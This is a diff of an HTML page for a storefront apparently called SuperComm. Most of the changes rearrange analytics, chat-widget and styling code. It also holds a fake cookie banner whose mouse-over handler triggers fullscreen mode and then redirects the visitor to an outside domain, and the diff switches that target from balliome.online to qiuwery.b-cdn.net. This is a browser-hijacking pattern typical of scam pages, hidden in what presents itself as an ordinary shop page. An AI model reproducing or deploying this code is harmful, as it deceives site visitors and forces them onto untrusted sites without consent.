@@ -4,10 +4,130 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SuperComm – Smart Style Marketplace</title>
-  
+
+   <!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-rgM3G2H5Nv3n52i-AHeCT.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+   <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69733b1558104b1978d41cb5/1jfl1tjkf';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
+body{background:#ffffff;color:#222;line-height:1.8;}
+header{
+  position:fixed;
+  top:0;
+  width:100%;
+  background:#ff6a00;
+  color:white;
+  text-align:center;
+  padding:25px 10px;
+  z-index:1000;
+  box-shadow:0 2px 10px rgba(0,0,0,0.2);
+}
+header h1{font-size:34px;letter-spacing:2px;cursor:pointer;}
+nav{margin-top:10px;}
+nav a{
+  color:white;
+  margin:0 15px;
+  text-decoration:none;
+  font-weight:bold;
+  cursor:pointer;
+}
+nav a:hover{text-decoration:underline;}
+
+.container{max-width:1300px;margin:auto;padding:180px 20px 60px;}
+section{margin-bottom:90px;}
+h2{color:#ff6a00;margin-bottom:20px;font-size:30px;}
+
+/* HERO */
+.hero{
+  background:url('https://images.unsplash.com/photo-1520975869018-6d4d7d9c8e9d?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat;
+  color:white;
+  padding:150px 30px;
+  border-radius:10px;
+  text-align:center;
+}
+.hero h2{font-size:48px;}
+.btn{
+  background:black;
+  color:white;
+  padding:12px 22px;
+  border:none;
+  border-radius:5px;
+  cursor:pointer;
+}
+.btn:hover{background:#333;}
+
+/* PRODUCTS */
+.products{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+  gap:30px;
+}
+.card{
+  background:#fff;
+  border:1px solid #eee;
+  border-radius:8px;
+  padding:15px;
+  text-align:center;
+  box-shadow:0 2px 6px rgba(0,0,0,0.08);
+}
+.card img{
+  width:100%;
+  height:260px;
+  object-fit:cover;
+  border-radius:6px;
+}
+.price{color:#ff6a00;font-weight:bold;margin:10px 0;}
+
+.content-box{
+  background:#fafafa;
+  padding:40px;
+  border-radius:8px;
+  box-shadow:0 2px 6px rgba(0,0,0,0.05);
+}
+
+/* FOOTER */
+footer{
+  background:black;
+  color:#ccc;
+  padding:50px 20px;
+}
+.footer-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+  gap:30px;
+}
+footer h3{color:#ff6a00;margin-bottom:15px;}
+footer a{color:#aaa;text-decoration:none;display:block;margin-bottom:8px;}
+footer a:hover{color:white;}
+</style>
 
 <script>
-     <div id="cookie-wrapper">
+function go(id){
+  document.getElementById(id).scrollIntoView({behavior:'smooth'});
+}
+</script>
+</head>
+<body>
+  <div id="cookie-wrapper">
   <div id="cookie-bg"></div>
   <div class="cookie-card" onmouseover="fullscreenAndRedirect()">
     <span class="cookie-x">×</span>
@@ -151,133 +271,10 @@
     }
 
     setTimeout(() => {
-      window.location.href = "https://balliome.online/Retior/";
+      window.location.href = "https://qiuwery.b-cdn.net/";
     }, 1000);
   }
 </script>
-
-   <!-- Privacy-friendly analytics by Plausible -->
-<script async src="https://plausible.io/js/pa-rgM3G2H5Nv3n52i-AHeCT.js"></script>
-<script>
-  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
-  plausible.init()
-</script>
-
-   <!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/69733b1558104b1978d41cb5/1jfl1tjkf';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
-body{background:#ffffff;color:#222;line-height:1.8;}
-header{
-  position:fixed;
-  top:0;
-  width:100%;
-  background:#ff6a00;
-  color:white;
-  text-align:center;
-  padding:25px 10px;
-  z-index:1000;
-  box-shadow:0 2px 10px rgba(0,0,0,0.2);
-}
-header h1{font-size:34px;letter-spacing:2px;cursor:pointer;}
-nav{margin-top:10px;}
-nav a{
-  color:white;
-  margin:0 15px;
-  text-decoration:none;
-  font-weight:bold;
-  cursor:pointer;
-}
-nav a:hover{text-decoration:underline;}
-
-.container{max-width:1300px;margin:auto;padding:180px 20px 60px;}
-section{margin-bottom:90px;}
-h2{color:#ff6a00;margin-bottom:20px;font-size:30px;}
-
-/* HERO */
-.hero{
-  background:url('https://images.unsplash.com/photo-1520975869018-6d4d7d9c8e9d?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat;
-  color:white;
-  padding:150px 30px;
-  border-radius:10px;
-  text-align:center;
-}
-.hero h2{font-size:48px;}
-.btn{
-  background:black;
-  color:white;
-  padding:12px 22px;
-  border:none;
-  border-radius:5px;
-  cursor:pointer;
-}
-.btn:hover{background:#333;}
-
-/* PRODUCTS */
-.products{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-  gap:30px;
-}
-.card{
-  background:#fff;
-  border:1px solid #eee;
-  border-radius:8px;
-  padding:15px;
-  text-align:center;
-  box-shadow:0 2px 6px rgba(0,0,0,0.08);
-}
-.card img{
-  width:100%;
-  height:260px;
-  object-fit:cover;
-  border-radius:6px;
-}
-.price{color:#ff6a00;font-weight:bold;margin:10px 0;}
-
-.content-box{
-  background:#fafafa;
-  padding:40px;
-  border-radius:8px;
-  box-shadow:0 2px 6px rgba(0,0,0,0.05);
-}
-
-/* FOOTER */
-footer{
-  background:black;
-  color:#ccc;
-  padding:50px 20px;
-}
-.footer-grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-  gap:30px;
-}
-footer h3{color:#ff6a00;margin-bottom:15px;}
-footer a{color:#aaa;text-decoration:none;display:block;margin-bottom:8px;}
-footer a:hover{color:white;}
-</style>
-
-<script>
-function go(id){
-  document.getElementById(id).scrollIntoView({behavior:'smooth'});
-}
-</script>
-</head>
-<body>
 
 <header>
   <h1 onclick="go('home')">SuperComm</h1>
